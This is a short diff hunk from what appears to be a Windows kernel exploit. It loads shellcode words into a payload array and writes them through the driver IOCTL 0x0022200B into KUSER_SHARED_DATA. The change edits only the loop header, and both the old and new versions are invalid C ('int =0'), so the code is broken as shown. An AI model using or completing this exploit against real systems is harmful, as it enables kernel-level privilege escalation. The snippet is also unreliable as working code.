@@ -308,7 +308,7 @@ const unsigned char payload[] = {
     payload[7] = 0x4800000360888948;
     payload[8] = 0x0000000000C3C031;
 
-    for (int =0,j=0; i < 9;i++,j+=8)
+    for (int =0,int j=0; i < 9;i++,j+=8)
     {
         SendToDriver(driverHandle,0x0022200B,(void*) &payload[i], (void*) (((unsigned long long) KUSER_SHARED_DATA)+j));
     }
